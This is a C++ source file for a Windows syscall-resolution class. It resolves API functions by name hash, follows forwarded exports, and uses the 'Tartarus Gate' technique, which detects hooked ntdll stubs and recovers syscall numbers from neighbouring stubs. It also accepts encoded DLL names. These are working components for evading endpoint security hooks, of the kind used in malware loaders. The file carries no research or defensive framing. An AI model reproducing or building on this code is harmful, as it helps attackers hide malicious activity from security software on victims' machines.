#include "syscall.hpp"

syscallHandling syscallHandler;


    
    PVOID syscallHandling::getFunctionAddressByHash(const wchar_t* library, DWORD targetHash)
    {
        HMODULE libraryBase = (HMODULE)helperHandler.GetModuleBase(library);
        //std::cout << "getting libraryBAse for "  << library << ":" << libraryBase;
        if (!libraryBase) return NULL;

        PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)libraryBase;
        PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)libraryBase + dosHeader->e_lfanew);

        DWORD exportRVA = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
        if (!exportRVA) return NULL;

        PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)libraryBase + exportRVA);

        PDWORD names = (PDWORD)((BYTE*)libraryBase + exportDir->AddressOfNames);
        PDWORD functions = (PDWORD)((BYTE*)libraryBase + exportDir->AddressOfFunctions);
        PWORD ordinals = (PWORD)((BYTE*)libraryBase + exportDir->AddressOfNameOrdinals);

        for (DWORD i = 0; i < exportDir->NumberOfNames; i++)
        {
            char* functionName = (char*)((BYTE*)libraryBase + names[i]);
            //std::cout << "printing all function names: " << functionName << "at index " << i << "\n";

            if (helperHandler.simpleHash(functionName) == targetHash)
            {
                DWORD functionRVA = functions[ordinals[i]];
                return (PVOID)((BYTE*)libraryBase + functionRVA);
            }
        }

        return NULL;
    }


    PVOID syscallHandling::getFunctionAddressByHashWithModule(HMODULE libraryBase, DWORD targetHash)
    {
        PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)libraryBase;
        PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)libraryBase + dosHeader->e_lfanew);

        IMAGE_DATA_DIRECTORY exportDirAttr = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
        DWORD exportRVA = exportDirAttr.VirtualAddress;
        DWORD exportSize = exportDirAttr.Size;

        if (!exportRVA) return NULL;

        PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)libraryBase + exportRVA);

        PDWORD names = (PDWORD)((BYTE*)libraryBase + exportDir->AddressOfNames);
        PDWORD functions = (PDWORD)((BYTE*)libraryBase + exportDir->AddressOfFunctions);
        PWORD ordinals = (PWORD)((BYTE*)libraryBase + exportDir->AddressOfNameOrdinals);

        for (DWORD i = 0; i < exportDir->NumberOfNames; i++)
        {
            char* functionName = (char*)((BYTE*)libraryBase + names[i]);

            if (helperHandler.simpleHash(functionName) == targetHash)
            {
                DWORD functionRVA = functions[ordinals[i]];
                PVOID functionAddr = (PVOID)((BYTE*)libraryBase + functionRVA);

                // --- THE FORWARDER FIX ---
                if (functionRVA >= exportRVA && functionRVA < (exportRVA + exportSize))
                {
                    // This is a forwarder string (e.g., "mscoreei.CLRCreateInstance")
                    std::string forwarderStr((char*)functionAddr);
                    size_t dotPos = forwarderStr.find('.');
                    if (dotPos != std::string::npos)
                    {
                        std::string dllName = forwarderStr.substr(0, dotPos) + ".dll";
                        std::string realFuncName = forwarderStr.substr(dotPos + 1);

                        // You need to resolve the address from the actual target DLL
                        HMODULE targetLib = GetModuleHandleA(dllName.c_str());
                        if (!targetLib) targetLib = LoadLibraryA(dllName.c_str());

                        return GetProcAddress(targetLib, realFuncName.c_str());
                    }
                }
                // -------------------------

                return functionAddr;
            }
        }
        return NULL;
    }

    syscallHandling::SYSCALL_DATA syscallHandling::getSyscallDataByHash(const wchar_t* library, DWORD targetHash) {
        syscallHandling::SYSCALL_DATA data = { 0 };
        // 1. Get the base address of the function using your existing hash logic
        PVOID funcAddr = syscallHandling::getFunctionAddressByHash(library, targetHash);

        if (!funcAddr) return data;

        // 2. Check if the function is hooked (JMP instruction)
        // 0xE9 is the opcode for a relative JMP
        if (*((PBYTE)funcAddr) == 0xE9 || *((PBYTE)funcAddr + 3) == 0xE9) {

            // --- TARTARUS GATE: NEIGHBOR SEARCH ---
            for (WORD idx = 1; idx <= 500; idx++) {
                // Check neighbor DOWN
                PVOID pDown = (PBYTE)funcAddr + (idx * DOWN);
                if (*((PBYTE)pDown) == 0x4c && *((PBYTE)pDown + 3) == 0xb8) {
                    data.ssn = *(WORD*)((PBYTE)pDown + 4) - idx;
                    data.syscallAddress = (PBYTE)pDown + 18; // Typical offset for 'syscall' inst
                    return data;
                }
                // Check neighbor UP
                PVOID pUp = (PBYTE)funcAddr + (idx * UP);
                if (*((PBYTE)pUp) == 0x4c && *((PBYTE)pUp + 3) == 0xb8) {
                    data.ssn = *(WORD*)((PBYTE)pUp + 4) + idx;
                    data.syscallAddress = (PBYTE)pUp + 18;
                    return data;
                }
            }
        }
        else {

            data.ssn = *(WORD*)((PBYTE)funcAddr + 4);


            for (int i = 0; i < 32; i++) {
                if (*(BYTE*)((BYTE*)funcAddr + i) == 0x0F && *(BYTE*)((BYTE*)funcAddr + i + 1) == 0x05) {
                    data.syscallAddress = (PVOID)((BYTE*)funcAddr + i);
                    break;
                }
            }
        }

        return data;
    }

    syscallHandling::SYSCALL_DATA syscallHandling::getSyscallDataFromEncoded(unsigned char* encodedDll, DWORD hash) {
        wchar_t wDll[64];
        size_t converted = 0;

        mbstowcs_s(&converted, wDll, 64, (char*)encodedDll, _TRUNCATE);

        return syscallHandling::getSyscallDataByHash(wDll, hash);
    }
